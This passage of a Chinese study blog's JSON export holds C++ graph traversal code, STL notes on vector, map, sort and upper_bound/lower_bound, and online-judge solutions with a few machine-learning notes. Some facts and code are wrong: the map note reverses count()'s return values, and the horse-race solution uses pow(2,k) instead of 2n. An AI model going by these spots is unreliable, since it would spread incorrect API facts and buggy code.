(PtrToAdjVNode)malloc(sizeof(struct AdjVNode)); NewNode-&gt;AdjV = E-&gt;V2; NewNode-&gt;Weight = E-&gt;Weight; //将v2插入v1的表头 NewNode-&gt;Next = Graph-&gt;G[E-&gt;V1].FirstEdge; Graph-&gt;G[E-&gt;V1].FirstEdge = NewNode; //若是无向图，还有插入边&lt;v2,v1&gt; //为v1建立新的邻接点 NewNode = (PtrToAdjVNode)malloc(sizeof(struct AdjVNode)); NewNode-&gt;AdjV = E-&gt;V1; NewNode-&gt;Weight = E-&gt;Weight; //将v1插入v2的表头 NewNode-&gt;Next = Graph-&gt;G[E-&gt;V2].FirstEdge; Graph-&gt;G[E-&gt;V2].FirstEdge = NewNode;&#125;LGraph BuildGraph()&#123; LGraph Graph; Edge E; Vertex V; int Nv, i; scanf(\"%d\", &amp;Nv); /*读入顶点个数*/ Graph = CreateGraph(Nv); /* 初始化有Nv个顶点但没有边的图 */ scanf(\"%d\", &amp;(Graph-&gt;Ne)); /*读入边数*/ if (Graph-&gt;Ne!=0) //如果有边 &#123; E = (Edge)malloc(sizeof(struct ENode)); //建立边结点 //读入边，格式为:起点，中点，权重；插入邻接 for (i = 0; i &lt; Graph-&gt;Ne;i++) &#123; scanf(\"%d %d %d\", &amp;E-&gt;V1, &amp;E-&gt;V2, &amp;E-&gt;Weight); //注意：如果权重不是整型，weight的读入格式要改变 InsertEdge(Graph, E); &#125; &#125; //如果顶点有数据的话，读入数据 for (V = 0; V &lt; Graph-&gt;Nv;V++) &#123; //scanf(\"%c\", &amp;(Graph-&gt;G[V].Data)); &#125; return Graph;&#125;/* 邻接矩阵存储的图 - BFS */bool Visited[MaxVertexNum] = &#123; false &#125;;void InitVisited()&#123; for (int i = 0; i &lt; MaxVertexNum;i++) &#123; Visited[i] = false; &#125;&#125;void Visit(Vertex v)&#123; printf(\"%d \", v);&#125;//连通下的DFS和BFSvoid DFS(LGraph Graph, Vertex V, void(*Visit)(Vertex))&#123; /*以V为出发点对邻接表存储的图Graph进行DFS搜索*/ PtrToAdjVNode W; Visit(V); //访问第V个顶点 Visited[V] = true; for (W = Graph-&gt;G[V].FirstEdge; W;W=W-&gt;Next) //对V的每个邻接点访问 &#123; if (!Visited[W-&gt;AdjV]) &#123; DFS(Graph, W-&gt;AdjV, Visit); &#125; &#125;&#125;//非连通下的遍历Vertex listDFS(LGraph Graph, void(*Visit)(Vertex))&#123; Vertex i; for (i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) break; &#125; if (i == Graph-&gt;Nv) return 0; DFS(Graph, i, Visit); printf(\"\\n\"); return listDFS(Graph, Visit);&#125;//图不连通时 列出各连通分量 void DFSListComponents(LGraph Graph, void(*Visit)(Vertex))&#123; for (Vertex i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) &#123; DFS(Graph, i, Visit); printf(\"\\n\"); &#125; &#125;&#125;void BFS(LGraph Graph, Vertex S, void(*Visit)(Vertex))&#123; /* 以S为出发点对邻接表存储的图Graph进行BFS搜索 */ queue&lt;Vertex&gt; Q; Vertex V; Visit(S); Visited[S] = true; Q.push(S); while (!Q.empty()) &#123; V = Q.front(); Q.pop(); for (PtrToAdjVNode tempV = Graph-&gt;G[V].FirstEdge; tempV;tempV=tempV-&gt;Next) /* 对W的每个邻接点tempV-&gt;AdjV */ /* 若W是V的邻接点并且未访问过 */ if (!Visited[tempV-&gt;AdjV] ) &#123; /* 访问顶点W */ Visit(tempV-&gt;AdjV); Visited[tempV-&gt;AdjV] = true; Q.push(tempV-&gt;AdjV); &#125; &#125;&#125;void BFSListComponents(LGraph Graph, void(*Visit)(Vertex))&#123; for (Vertex i = 0; i &lt; Graph-&gt;Nv; i++) &#123; if (Visited[i] == false) &#123; BFS(Graph, i, Visit); printf(\"\\n\"); &#125; &#125;&#125;int main()&#123; LGraph graph; graph = BuildGraph(); InitVisited(); listDFS(graph, &amp;Visit); InitVisited(); DFSListComponents(graph, &amp;Visit); InitVisited(); //BFS(graph,0,&amp;Visit); BFSListComponents(graph, &amp;Visit); return 0;&#125; 结果： BFS广度优先搜索(Breadth First Search, BFS) 运用队列，将顶点V的每个邻接点进队。(类似于树的层先遍历) 若有N个顶点、E条边，时间复杂度是 用邻接表存储图，有O(N+E) 用邻接矩阵存储图，有O(N^2) 广度优先遍历（BFS） 关键词： 队列；入队；出队 for each 邻居顶点；入队；出队；出队者的邻居顶点入队。 DFS深度优先搜索索(Depth First Search, DFS) 用递归(类似于树的先序遍历)。 ListComponents 图不连通时，列出各连通分量。 若有N个顶点、E条边，时间复杂度是 用邻接表存储图，有O(N+E) 用邻接矩阵存储图，有O(N^2) 深度优先遍历（DFS） 关键词： 递归；回溯；返回 for each 邻居顶点；DFS；","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"图-Graph","slug":"数据结构与算法-Data-Structure-and-Algorithm/图-Graph","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/图-Graph/"}]},{"title":"邓俊辉《数据结构》笔记——第一章","date":"2018-06-05T13:10:50.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/俊辉《数据结构》笔记——第一章/","text":"每个递归实例的计算都是常数时间（就是一步加法） 以二为倍数的几何级数。 几何级数的总和与他的末项（最后一个元素）同阶。 底层有n个递归实例。","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"}]},{"title":"笔记：MobileNet，尺度和语义增强的语义分割，通过可见框增强全框，语义分割联合物体检测","date":"2018-05-30T02:32:44.000Z","path":"wiki/深度学习-Deep Learning/CNN/记：MobileNet，尺度和语义增强的语义分割，通过可见框增强全框，语义分割联合物体检测/","text":"MobileNet 尺度和语义增强的语义分割 可见框增强全框的行人检测 联合物体检测和语义分割","tags":[],"categories":[{"name":"深度学习-Deep Learning","slug":"深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/"},{"name":"CNN","slug":"深度学习-Deep-Learning/CNN","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/CNN/"}]},{"title":"选择题每日练习","date":"2018-05-02T09:40:31.000Z","path":"wiki/便签-Cheat Sheet/选择题每日练习/","text":"（1）数据类型字节数 （2）词法分析器","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"}]},{"title":"A Critical Review of Recurrent Neural Networks for Sequence Learning","date":"2018-04-27T14:38:36.000Z","path":"wiki/深度学习-Deep Learning/LSTM/-Critical-Review-of-Recurrent-Neural-Networks-for-Sequence-Learning/","text":"","tags":[],"categories":[{"name":"深度学习-Deep Learning","slug":"深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/"},{"name":"LSTM","slug":"深度学习-Deep-Learning/LSTM","permalink":"http://yoursite.com/categories/深度学习-Deep-Learning/LSTM/"}]},{"title":"周志华《机器学习》读书笔记-第2章-模型评估与选择","date":"2018-04-26T03:37:16.000Z","path":"wiki/读书笔记/《机器学习》——周志华”西瓜书“/2章模型评估与选择/","text":"分类的性能度量 我的一些想法： （1）对于“若干次随机划分，重复进行实验评估后取平均值”评价模型的想法：类似CNN这种模型，“一个模型+一套权重”算是一个完整的解决方案。模型脱离权重具有科学意义（比如跨连接这种结构好，他不只是在FPN上好，放到我的网络上一样好），但是在工程上意义有限。调出一个模型+一套好权重更重要。 AUC考虑的是“排序质量”？ 从Mann–Whitney U statistic的角度来解释，AUC就是从所有1样本中随机选取一个样本， 从所有0样本中随机选取一个样本，然后根据你的分类器对两个随机样本进行预测，把1样本预测为1的概率为p1，把0样本预测为1的概率为p0，p1&gt;p0的概率就等于AUC。所以AUC反应的是分类器对样本的排序能力。根据这个解释，如果我们完全随机的对样本分类，那么AUC应该接近0.5。另外值得注意的是，AUC对样本类别是否均衡并不敏感，这也是不均衡样本通常用AUC评价分类器性能的一个原因。 【杂纪】从ROC曲线到AUC值，再到Mann–Whitney U统计量：https://blog.csdn.net/joyliness/article/details/79156879 第一部分是对AUC的基本介绍，包括AUC的定义，解释，以及算法和代码，第二部分用逻辑回归作为例子来说明如何通过直接优化AUC来训练，第三部分如何根据auc值来计算真正的类别（对auc的反向工程）。https://www.zhihu.com/question/39840928 ROC曲线的一个优点就是，它和测试样本的类别分布于与误分类代价无关，即无论测试样本的正反例比例如何变化、无论误分类代价如何变化，分类器的ROC曲线都是不变的。一个指定的（类别分布，误分类代价）称为一个operating condition。假设现在指定测试样本中正例所占比例为p(+)，反例所占比例为p(−)，有p(−)=1−p(+)。另外，误分类代价C(+|−)和C(−|+)，分别表示实际为反例但预测成正例的代价和实际为正例但预测成反例的代价。这样得到一个operating condition，根据这个operating condition我们可以通过以下公式计算出一个值：S=p(−)C(+|−)/p(+)C(−|+)(2) 以S为斜率，在ROC空间上通过平移可以得到很多条直线，称为iso-performance直线。每条直线上的所有点对应的分类器有相同的期望代价；并且越靠近左上角的iso-performance直线，对应的分类器性能越好。","tags":[],"categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://yoursite.com/categories/读书笔记/"},{"name":"《机器学习》——周志华”西瓜书“","slug":"读书笔记/《机器学习》——周志华”西瓜书“","permalink":"http://yoursite.com/categories/读书笔记/《机器学习》——周志华”西瓜书“/"}]},{"title":"360 2017春招——任务列表","date":"2018-04-20T14:56:59.000Z","path":"wiki/Online Judge/60-2017春招——任务列表/","text":"这道题目只需要懂得STL的基本使用：vector，sort()，upper_bound()，lower_bound()之类的。 题目描述 现在现在有一台机器，这台机器可以接收两种形式任务：（1）任务列表，任务列表里面有N个任务，对于第i个任务，机器在Ti时间开始执行，并在1个单位时间内做完。（2）临时任务，机器可以在任意时间接收一个临时任务，但任务列表里面的任务优先级要高于临时任务，也就是说当机器空闲的时候才会执行临时任务。 现在机器已经接收一个任务列表。接下来会有M个临时任务，我们想知道每个临时任务何时被执行。为了简化问题我们可以认为这M个临时任务是独立无关即任务是可以同时执行的，互不影响的。 输入 输入数据有多组，每组数据第一行包括两个整数N和M（1&lt;=N, M&lt;=10^5）。 接下来一行有N个不同数字T1,T2,T3.....TN（1&lt;=T1） 接下来又M行，每行一个数字Qi（1&lt;=Qi&lt;=10^9），表示第i个临时任务的的接收时间。 样例输入 5 6 1 2 3 5 6 3 2 1 4 5 6 输出 对于每个临时任务，输出它被执行的时间。 样例输出 4 4 4 4 7 7 时间限制 C/C++语言：2000MS其它语言：4000MS 内存限制 C/C++语言：32768KB其它语言：557056KB 思路： （1）找到空闲 怎么找？【1】排序sort()；【2】因为输入的是不同的数字，只要在“1”到“最大开始时间+1”（最后一个任务的下一个）中间，在任务列表里面不存在的，就是空闲。 （2）将“临时任务”插入“空闲表”里面能插进的第一个元素：用lower_bound()-&gt;能插入的第一个位置的元素 Tips: 以后遇到upper_bound()，lower_bound()分不清楚的，可以直接把upper_bound()，lower_bound()，upper_bound()±1，lower_bound()±1都试一遍。 AC代码： 123456789101112131415161718192021222324252627282930313233343536373839#include&lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;#include &lt;iterator&gt;using namespace std;int main()&#123; vector&lt;int&gt; tasks; vector&lt;int&gt; spare; int n = 0; int m = 0; scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 0; i &lt; n; i++) &#123; int task = 0; cin &gt;&gt; task; tasks.push_back(task); &#125; sort(tasks.begin(),tasks.end()); int largest = tasks.back(); for (int i = 1; i &lt;= largest+1; i++) &#123; vector&lt;int&gt;::iterator s = find(tasks.begin(), tasks.end(), i); if (s == tasks.end()) &#123; spare.push_back(i); &#125; &#125; vector&lt;int&gt;::iterator location; for (int i = 0; i &lt; m; i++) &#123; int temp = 0; cin &gt;&gt; temp; location = lower_bound(spare.begin(), spare.end(), temp); cout &lt;&lt; spare[location-spare.begin()]&lt;&lt;endl; &#125; return 0;&#125;","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"STL速记——对string的各种操作","date":"2018-04-18T13:04:12.000Z","path":"wiki/STL/TL速记——对string的各种操作/","text":"（1）大小写转换 （2）查找子字符串 （3）子字符串前后数量 （4）大小写字符数量","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——upper_bound()和lower_bound()","date":"2018-04-16T14:15:55.000Z","path":"wiki/STL/STL速记——upper-bound-和lower-bound/","text":"首先，最形象的一句话： upper_bound（i） 返回的是键值为i的元素可以插入的最后一个位置（上界） 。 lowe_bound（i） 返回的是键值为i的元素可以插入的位置的第一个位置（下界）。 怎么理解呢，举例： 在升序的set里面 set里没有元素i的时候，两个元素的返回值是一样的。 1 2 4 5 这个序列，upp（3）和low（3）都返回位置2（下标） 如果只有一个元素i，low返回那个元素的位置，而upp返回那个元素的位置的后一个位置。 1 2 4 5 这个序列upp（2）返回下标2而low（2）返回下标1 多个元素i，low返回那个元素的位置，upp返回那多个元素中的最后一个的后一个位置。 1 2 2 4 5 这个序列 upp（2）返回下标3的位置，low（2）返回下标1的位置。 ！！！！！！！！！！！！！ 特别注意：举例在一个升序的容器里，如果所有元素都大于i则，upp和low都返回begin。都小于i则返回end（越界了）。 最后再来一句，看是否好理解一些。 terator lower_bound( const key_type &amp;key ): 返回一个迭代器，指向键值&gt;= key的第一个元素。 iterator upper_bound( const key_type &amp;key ):返回一个迭代器，指向键值&lt;=key的最后一个元素的后一个元素。 ★降序排列的容器： iterator lower_bound( const key_type &amp;key ): 返回一个迭代器，指向键值&lt;= key的第一个元素。 iterator upper_bound( const key_type &amp;key ):返回一个迭代器，指向键值&gt;=key的最后一个元素的后一个元素。","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"Markdown常用命令速记","date":"2018-04-16T07:15:39.000Z","path":"wiki/便签-Cheat Sheet/Markdown/arkdown常用命令速记/","text":"（1）设置图像大小 &lt;img src=&quot;/images/pasted-27.png&quot; width=&quot;30%&quot; height=&quot;30%&quot;&gt;","tags":[],"categories":[{"name":"便签-Cheat Sheet","slug":"便签-Cheat-Sheet","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/"},{"name":"Markdown","slug":"便签-Cheat-Sheet/Markdown","permalink":"http://yoursite.com/categories/便签-Cheat-Sheet/Markdown/"}]},{"title":"STL速记——map","date":"2018-04-08T13:25:55.000Z","path":"wiki/STL/TL速记——map/","text":"map的性质（1）一一映射，不能重复。 （2）数据有序：自动升序排序。（map内部自建一颗红黑树，这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的） map的插入map键都是唯一的，如果插入相同的key, mapObj.insert()不会覆盖原来的键值，mapObj[]会覆盖键值。 几种插入方法： （1）insert() + make_pair()【insert()不覆盖】 12std::map&lt;int, int&gt; mapObj; mapObj.insert(std::make_pair(0, 100)); （2）insert() + pair&lt;,&gt;(,)【insert()不覆盖】 12map&lt;unsigned int, string&gt; Student; Student.insert(pair&lt;unsigned int, string&gt;(1, &quot;CJY&quot;)); (3)下标键值插入Obj[1] = “OQQ”;12map&lt;unsigned int, string&gt; Student; Student[1] = &quot;OQQ&quot;; 是否插入成功： 1234567891011map&lt;int, string&gt; mapStudent;pair&lt;map&lt;int, string&gt;::iterator, bool&gt; Insert_Pair;Insert_Pair ＝ mapStudent.insert(pair&lt;int, string&gt;(1, “student_one”));if(Insert_Pair.second == true)&#123; cout&lt;&lt;”Insert Successfully”&lt;&lt;endl;&#125; else&#123; cout&lt;&lt;”Insert Failure”&lt;&lt;endl;&#125; map的取值（1）数组： Obj[1] (2)迭代器 iter-&gt;first //读key iter-&gt;second //读value map的迭代（1）正向迭代 1234for ( m1_Iter = m1.begin( ); m1_Iter != m1.end( ); m1_Iter++ )cout &lt;&lt; &quot; &quot; &lt;&lt; m1_Iter -&gt; second;cout &lt;&lt; &quot;.&quot; &lt;&lt; endl;&#125; （2）反向迭代 1234for(iter = mapStudent.rbegin(); iter != mapStudent.rend(); iter++)&#123; cout&lt;&lt;iter-&gt;first&lt;&lt;” ”&lt;&lt;iter-&gt;second&lt;&lt;end;&#125; （3）数组的迭代 12345for(int nIndex = 0; nIndex &lt; mapStudent.size(); nIndex++)&#123; cout&lt;&lt;mapStudent[nIndex]&lt;&lt;end;&#125; map的查找（1）count(): 返回0 -&gt; 存在；返回1 -&gt; 不存在； （2）find(): 用find函数来定位数据出现位置，它返回的一个迭代器，当数据出现时，它返回数据所在位置的迭代器，如果map中没有要查找的数据，它返回的迭代器等于end函数返回的迭代器 1234567891011map&lt;int, string&gt; mapStudent;map&lt;int, string&gt;::iterator iter;iter = mapStudent.find(1);if(iter != mapStudent.end())&#123; cout&lt;&lt;”Find, the value is ”&lt;&lt;iter-&gt;second&lt;&lt;endl;&#125;else&#123; cout&lt;&lt;”Do not Find”&lt;&lt;endl;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"360 2017年春招——分金子","date":"2018-04-04T14:18:52.000Z","path":"wiki/Online Judge/360笔试题——2017年春招/","text":"分金子A、B两伙马贼意外地在一片沙漠中发现了一处金矿，双方都想独占金矿，但各自的实力都不足以吞下对方，经过谈判后，双方同意用一个公平的方式来处理这片金矿。处理的规则如下：他们把整个金矿分成n段，由A、B开始轮流从最左端或最右端占据一段，直到分完为止。 马贼A想提前知道他们能分到多少金子，因此请你帮忙计算他们最后各自拥有多少金子?（两伙马贼均会采取对己方有利的策略） 输入 测试数据包含多组输入数据。输入数据的第一行为一个正整数T(T&lt;=20)，表示测试数据的组数。然后是T组测试数据，每组测试数据的第一行包含一个整数n，下一行包含n个数（n &lt;= 500 ），表示每段金矿的含金量，保证其数值大小不超过1000。 样例输入 2 6 4 7 2 9 5 2 10 140 649 340 982 105 86 56 610 340 879 输出 对于每一组测试数据，输出一行&quot;Case #id: sc1 sc2&quot;，表示第id组数据时马贼A分到金子数量为sc1，马贼B分到金子数量为sc2。详见样例。 样例输出 Case #1: 18 11 Case #2: 3206 981 时间限制 C/C++语言：1000MS 其他语言：3000MS 内存限制 C/C++语言：65536KB 其他语言：589824KB 解题笔记： 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdlib.h&gt;#include &lt;cstdio&gt;int min(int a, int b)&#123; if(a&lt;b) &#123; return a; &#125; else &#123; return b; &#125;&#125;int sum_i_j(int a[],int i,int j)&#123; int sum = 0; int m =i; while(m&lt;=j) &#123; sum = sum + a[m]; m++; &#125; return sum;&#125;int max_a(int a[],int size)&#123; int res = 0; int array2D[505][505] = &#123;0&#125;; for (int i=0;i&lt;size;i++) &#123; array2D[i][i]=a[i]; &#125; for (int i=1;i&lt;size;i++) &#123; for (int j=0;j&lt;size;j++) &#123; int sum = 0; sum = sum_i_j(a,j,i+j); array2D[j][i+j] = sum-min(array2D[j+1][i+j],array2D[j][i+j-1]); &#125; &#125; res = array2D[0][size-1]; return res;&#125;int main ()&#123; int n = 0; scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) &#123; int m = 0; scanf(&quot;%d&quot;,&amp;m); int a[505] = &#123;0&#125;; for(int j = 0; j&lt;m;j++) &#123; scanf(&quot;%d&quot;,&amp;a[j]); &#125; int a_max = max_a(a,m); int b_max = sum_i_j(a,0,m)-a_max; printf(&quot;Case #%d: %d %d\\n&quot;,i+1,a_max,b_max); &#125; return 0;&#125;","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"360 2018年春招——交易、赛马、玫瑰花","date":"2018-04-04T14:05:39.000Z","path":"wiki/Online Judge/0笔试题：2018年春招/","text":"题目一交易 题目描述 茉莉发起了一场交易，她将她的5个朋友聚在一起准备进行一场交易。交易开始前，大家各有b(b&gt;0)个硬币，交易后，每个人有ai个硬币。由于硬币不方便携带，在交易过程中可能丢失。现在茉莉想知道是否一定会丢失硬币，或者在可能没有丢失硬币的情况下，交易前每个人的硬币数b。茉莉只是组织者，不参与交易。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行5个整数，第i个整数ai表示交易后第i个朋友的硬币数。（0&lt;=ai&lt;=100） 输出 对于每组数据，输出一行，若一定丢失硬币则输出-1，若尽可能没有丢失，则输出b。 样例输入 2 2 5 4 0 4 4 5 9 2 1 样例输出 3 -1 思路 看起来只要每行加起来模5等于0就没有丢失，比如第一行加起来是15，除以5等于3，第二行加起来是21，除以5除不尽，所以输出-1. 注意要考虑全0的情况，全0模5也是0，但是因为b&gt;0，现在全0了，说明一定发生了丢失，所以不能输出0，而应该输出-1. AC 90% 的代码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int a[5] = &#123; 0 &#125;; int sum = 0; for (int j = 0; j&lt;5; j++) &#123; scanf(&quot;%d&quot;, &amp;a[j]); sum = sum + a[j]; &#125; if (sum % 5 == 0) &#123; int ans = 0; ans = sum / 5; printf(&quot;%d\\n&quot;, ans); &#125; else &#123; printf(&quot;%d\\n&quot;, -1); &#125; &#125; return 0;&#125; 现在分析，应该是没有考虑全0的情况 修改后的代码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int a[5] = &#123; 0 &#125;; int sum = 0; for (int j = 0; j&lt;5; j++) &#123; scanf(&quot;%d&quot;, &amp;a[j]); sum = sum + a[j]; &#125; if (sum == 0) &#123; printf(&quot;-1\\n&quot;); break; &#125; if (sum % 5 == 0) &#123; int ans = 0; ans = sum / 5; printf(&quot;%d\\n&quot;, ans); &#125; else &#123; printf(&quot;%d\\n&quot;, -1); &#125; &#125; return 0;&#125; 题目二赛马 题目描述 茉莉有2n匹马，每匹马都有一个速度v，现在茉莉将马分为两个队伍，每个队伍各有n匹马，两个队之间进行n场比赛，每场比赛两队各派出一匹马参赛，每匹马都恰好出场一次。茉莉想知道是否存在一种分配队伍的方法使得无论怎么安排比赛，第一个队伍都一定能获的全胜，两匹马若速度一样，那么速度快的获胜，若速度一样，则都有可能获胜。 输入 第一行一个数T(T&lt;=100)，表示数据组数。 对于每组数据，第一行一个整数n，(1&lt;=n&lt;=100) 接下来一行，2n个整数，第i个整数vi表示第i匹马的速度（1&lt;=vi&lt;=1000） 输出 对于每组数据，输出一行，若存在一种分配方法使得第一个队伍全胜输出YES，否则输出NO 样例输入 2 2 1 2 3 4 1 1 1 样例输出 YES NO 思路： 先将数组排序，分成两半（各n），若左边最后一个元素小于右边第一个元素，就能保证不管怎么比赛都能全胜。 基于vector的代码： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; int n = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) &#123; int k = 0; scanf(&quot;%d&quot;, &amp;k); vector &lt;int&gt; a; int num = pow(2,k); for (int j = 0; j&lt;num; j++) &#123; int input = 0; scanf(&quot;%d&quot;, &amp;input); a.push_back(input); &#125; sort(a.begin(), a.end()); //找到中点 int k1 = a.size() / 2; if (a.at(k1 - 1) &lt; a.at(k1)) &#123; printf(&quot;YES\\n&quot;); &#125; else &#123; printf(&quot;NO\\n&quot;); &#125; &#125; return 0;&#125; 玫瑰花题目描述 有K种不同的玫瑰花，现在要摆放在N各位置，要求每种颜色的花至少出现过一次，请问有多少种不同的方案数呢？因为答案可能很大，你需要输出它对772235取余后的结果。 输入 输入只有1行，分别有两个整数N，K（1&lt;=N&lt;=50000，1&lt;=K&lt;=30） 输出 输出一行表示答案 样例输入 3 2 样例输出 6 题目分析： C++动态分配二维数组： 12345678 int row = 0;int col = 0;scanf(&quot;%d %d&quot;,)int** array = new int*[row];for (int i = 0; i&lt;row; i++)&#123; array[i] = new int[col];&#125; C++释放动态分配的二维数组： 12345678 int row = 0;int col = 0;scanf(&quot;%d %d&quot;,)int** array = new int*[row];for (int i = 0; i&lt;row; i++)&#123; array[i] = new int[col];&#125; 12345for(int i=0; i&lt;row; i++) &#123; delete[] array[i]; &#125; delete[] array; 整体代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;vector&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int N = 0; int K = 0; scanf(&quot;%d %d&quot;, &amp;N, &amp;K); if (N &lt; K) &#123; printf(&quot;%d\\n&quot;, 0); &#125; else &#123; if (N == K) &#123; int res = 1; for (int j = K; j &gt; 0; j--) &#123; res = res*j; &#125; printf(&quot;%d\\n&quot;, res); &#125; else &#123; int** DP = new int*[N+1]; for (int i = 0; i&lt;=N; i++) &#123; DP[i] = new int[2]; &#125; for (int i = 0; i&lt;=N; i++) DP[i][0] = 0; DP[0][1] = 0; for (int k = 1; k&lt;=K; k++) &#123; //确定递推开始的“头部” int res = 1; for (int j = k; j &gt; 0; j--) &#123; res = res*j; &#125; DP[k][k % 2] = res; for (int n = k + 1; n&lt;=N; n++) &#123; if ((k % 2) == 1) &#123;//此时i是奇数 DP[n][1] = k*(DP[n - 1][1] + DP[n - 1][0]); //printf(&quot;%d&quot;,DP[n][1]); &#125; else &#123; DP[n][0] = k*(DP[n - 1][0] + DP[n - 1][1]); //printf(&quot;%d&quot;, DP[n][0]); &#125; //printf(&quot;End of loop %d&quot;, n); &#125; &#125; printf(&quot;%d\\n&quot;,DP[N][K%2]); for (int i = 0; i&lt;=N; i++) &#123; delete[] DP[i]; &#125; delete[] DP; &#125; &#125; return 0;&#125; 注意：这个表格是[0,N]和[0,K]，共N+1行，K+1列，所以分配内存的时候要分配N+1和K+1，循环里要用&lt;=","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"STL速记——sort()","date":"2018-04-04T13:23:01.000Z","path":"wiki/STL/TL速记——sort/","text":"代码示例1： sort()对数组排序。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include&lt;algorithm&gt;using namespace std;bool cmp_less(int i, int j)&#123; return (i &lt; j);&#125;bool cmp_greater(int i, int j)&#123; return (i &gt; j);&#125;int main()&#123; int a[100] = &#123; 0 &#125;; for (int i = 0; i &lt; 100; i++) &#123; if (i &lt; 10) &#123; a[i] = 5; &#125; else &#123; a[i] = 100 - i; &#125; &#125; sort(a, a + 100, cmp_less); sort(a, a + 100, cmp_greater); for (int i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;, a[i]); &#125; return 0;&#125; 代码示例2： sort()对vector排序。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;using namespace std;#include&lt;algorithm&gt;bool cmp_less(int i, int j)&#123; return (i &lt; j);&#125;bool cmp_greater(int i, int j)&#123; return (i &gt; j);&#125;int main()&#123; vector &lt;int&gt; a; for (int i = 0; i &lt; 100; i++) &#123; if (i &lt; 10) &#123; a.push_back(5); &#125; else &#123; a.push_back(100 - i); &#125; &#125; sort(a.begin(), a.end(), cmp_less); sort(a.begin(), a.end(), cmp_greater); for (int i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;, a[i]); &#125; return 0;&#125;","tags":[],"categories":[{"name":"STL","slug":"STL","permalink":"http://yoursite.com/categories/STL/"}]},{"title":"STL速记——vector","date":"2018-04-04T07:57:30.000Z","path":"wiki/STL/TL速记——vector/","text":"一、vector是“动态数组” vector收录在STL里，是一种特殊的数据结构。它的中文名字叫做“动态数组”或者“不定长数组”，有时也被翻译成“容器”。 说白了，vector就是一个功能强大的数组。下面让我们来体验它强大的功能吧！ 二、vector的头文件 vector收录在std库里，所以调用vector需要 #include&lt;vector&gt; using namespace std; 这两个头文件。 三、vector的声明与构造函数 既然是“动态数组”，vector是一个什么数组呢，int？double？或者结构体数组？ 我们可以这样声明一个vector： vector &lt;数据类型&gt; 动态数组名; 比如： vector &lt;int&gt; i;//一个int的动态数组 vector &lt;char&gt; c;//一个char的动态数组 vector &lt;node&gt; n;//一个node的动态数组（node是结构体名） 如果你想赋初值，你可以： vector &lt;int&gt; M(a,b);//在M里装a个b vector &lt;int&gt; N(a); //在N里装a个0 当然你也可以： vector &lt;int&gt; A; vector &lt;int&gt; B(A);//一个和A一模一样的动态数组 vector &lt;int&gt; C(B.begin()+l,B.end()-r);//继承B动态数组下标[l,B.end()-r)的值，注意，下标从0开始，begin()，end()，size()三个函数见下文 四、vector的析构函数 很简单，你可以vector &lt;A&gt; B;//A是某种数据结构，B是动态数组名 如果你想析构它，只需调用B.~vector&lt;A&gt;(); 即可。 也就是说，vector的析构函数是：动态数组名.~vector&lt;该数组的数据结构&gt;(); vector似乎一般不用手动调用析构函数。 五、vector的基本操作 以vector &lt;int&gt; v为例： ① v[i]或v.at(i)//返回v[i]的值 ② v.size();//返回v数组元素总个数 ③ v.front();//返回v数组第一个元素的值 ④ v.back();//返回v数组最后一个元素的值 ⑤ v.clear();//清空v数组 ⑥ v.begin();//返回v数组第一个数的下标 ⑦ v.end();//返回v数组最后一个数的下标 ⑧ v.empty();//判断v数组是否为空，是空则返回1(true)，非空（有元素）则返回0(false) ⑨ v.swap(v1);//v1是另一个动态数组，将v和v1元素互换 ⑩ 